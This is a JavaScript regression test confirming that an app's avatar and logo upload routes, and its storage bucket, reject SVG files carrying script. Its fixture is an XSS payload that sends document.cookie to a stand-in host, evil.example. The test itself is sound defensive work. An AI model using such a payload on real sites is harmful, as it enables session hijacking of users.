// Confirms the SVG stored-XSS fix: an SVG carrying an actual <script> payload is
// rejected by the app-level check before it ever reaches storage, the storage
// bucket's own allowed_mime_types rejects it too (a second, independent layer --
// checked by calling Storage directly, bypassing the app route entirely), and real
// PNG/JPEG/WebP uploads still work exactly as before. Run against a live
// `wrangler dev` + local Supabase.
import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = "http://127.0.0.1:54321";
const SERVICE_KEY = process.env.SUPABASE_SECRET_KEY;
const ANON_KEY = process.env.SUPABASE_PUBLISHABLE_KEY;
const API_BASE = "http://127.0.0.1:8787";

function assert(cond, msg) {
  if (!cond) throw new Error("ASSERTION FAILED: " + msg);
  console.log("  ok:", msg);
}

const TINY_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";

const MALICIOUS_SVG = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
</svg>`;

async function main() {
  const admin = createClient(SUPABASE_URL, SERVICE_KEY);
  const email = `no-svg-upload-test-${Date.now()}@example.test`;
  const password = "test-password-123!";
  await admin.auth.admin.createUser({ email, password, email_confirm: true });
  const anon = createClient(SUPABASE_URL, ANON_KEY);
  const { data: signIn } = await anon.auth.signInWithPassword({ email, password });
  const accessToken = signIn.session.access_token;

  await fetch(`${API_BASE}/api/tenant-provision`, { method: "POST", headers: { Authorization: `Bearer ${accessToken}` } });
  const { widget } = await (
    await fetch(`${API_BASE}/api/create-widget`, {
      method: "POST",
      headers: { Authorization: `Bearer ${accessToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ name: "No SVG Upload Test" }),
    })
  ).json();

  console.log("--- App layer: a malicious SVG is rejected for both avatar and logo ---");
  for (const route of ["upload-widget-avatar", "upload-widget-logo"]) {
    const form = new FormData();
    form.append("widget_id", widget.id);
    form.append("file", new Blob([MALICIOUS_SVG], { type: "image/svg+xml" }), "evil.svg");
    const res = await fetch(`${API_BASE}/api/${route}`, { method: "POST", headers: { Authorization: `Bearer ${accessToken}` }, body: form });
    const body = await res.json();
    console.log(`  ${route}: ${res.status} ${JSON.stringify(body)}`);
    assert(res.status === 400, `${route} rejects an SVG with a script payload (${res.status})`);
  }

  console.log("--- Storage layer: the bucket itself also rejects SVG (bypassing the app route) ---");
  const { error: storageError } = await admin.storage
    .from("widget-logos")
    .upload(`${widget.id}/direct-svg-test`, MALICIOUS_SVG, { contentType: "image/svg+xml", upsert: true });
  assert(!!storageError, `the widget-logos bucket's own allowed_mime_types rejects image/svg+xml directly (error: ${storageError?.message})`);

  console.log("--- Real images still upload fine (no regression) ---");
  const pngBytes = Buffer.from(TINY_PNG_BASE64, "base64");
  for (const route of ["upload-widget-avatar", "upload-widget-logo"]) {
    const form = new FormData();
    form.append("widget_id", widget.id);
    form.append("file", new Blob([pngBytes], { type: "image/png" }), "logo.png");
    const res = await fetch(`${API_BASE}/api/${route}`, { method: "POST", headers: { Authorization: `Bearer ${accessToken}` }, body: form });
    assert(res.ok, `${route} still accepts a real PNG (${res.status})`);
  }

  await admin.from("tenants").delete().eq("id", (await admin.from("widgets").select("tenant_id").eq("id", widget.id).single()).data.tenant_id);
  console.log("\nALL NO-SVG-UPLOAD CHECKS PASSED");
}

main().catch((err) => {
  console.error("FAILED:", err);
  process.exit(1);
});
